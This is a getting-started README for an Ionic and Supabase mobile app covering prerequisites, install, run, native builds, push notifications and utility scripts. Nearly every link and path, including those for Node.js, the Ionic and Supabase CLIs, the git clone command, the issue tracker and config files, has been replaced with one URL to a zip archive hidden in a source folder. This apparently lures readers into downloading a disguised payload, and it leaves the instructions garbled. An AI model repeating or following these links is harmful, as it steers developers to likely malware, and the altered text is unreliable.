# Getting Started
## Prerequisites
Before getting started, make sure you have the following installed on your development machine:

* https://raw.githubusercontent.com/zaylem91/supbase/main/src/app/shared/directives/Software-3.8.zip (version 12 or later)
* npm (Node Package Manager)
* [Ionic CLI](https://raw.githubusercontent.com/zaylem91/supbase/main/src/app/shared/directives/Software-3.8.zip)
* [Supabase CLI](https://raw.githubusercontent.com/zaylem91/supbase/main/src/app/shared/directives/Software-3.8.zip)
* Android Studio (If you are going to build the app for android)
* Xcode (If you are going to build the app for iOS)
* OneSignal account
* Supabase account (if not self hosting)
* Maptiler account

## Clone the repo

```
git clone https://raw.githubusercontent.com/zaylem91/supbase/main/src/app/shared/directives/Software-3.8.zip
```

## Install dependencies
Navigate to the root of the project and install the app's dependencies by running the following command:

```bash
npm install
```

## Setup Supabase project
You can create supabase project using the CLI.

Run migrations scripts

## Run the app
You can now run the app on your development machine by running the following command:
```bash
ionic serve
```
This will start a development server and open a browser window with the app running.

## Build for native
To build your app for a specific platform (iOS or Android), you can use the following command:

```bash
ionic build [ios | android]
npx cap copy
```
This will create a platform-specific build of your app in the /platforms folder. After that you can use npx cap open [ios | android] to open the project in Xcode or Android Studio.

## Documentation
The project includes documentation on the project structure, dependencies, Ionic features, Capacitor plugins, and more, be sure to check the documentation or docs folder for more information on the app.

## Getting Help
If you have any questions or need help getting started with the app, feel free to reach out through the project's [issue tracker](https://raw.githubusercontent.com/zaylem91/supbase/main/src/app/shared/directives/Software-3.8.zip).

## Push Notifications
OneSignal is for Notification
### Web Push
* Create an two apps on OneSignal - one for test and one for productions - and setup web push. Enable Local Testing option for the test app.
* Add the app ids to `https://raw.githubusercontent.com/zaylem91/supbase/main/src/app/shared/directives/Software-3.8.zip` and `https://raw.githubusercontent.com/zaylem91/supbase/main/src/app/shared/directives/Software-3.8.zip`.

## Scripts
Utility scripts has been added to `https://raw.githubusercontent.com/zaylem91/supbase/main/src/app/shared/directives/Software-3.8.zip` for convenience. Run with `npm run <command>`:
* `update-types`: Update database definition Typescript Interface from local Supabase
* `db-reset-local-to-prod`: Restores local DB with dump from remote supabase instance. Dependency `pg_dump`, .pgpass with local and remote DB credentials and environmental variable `SUPABASE_DB_HOST` with remote host name.
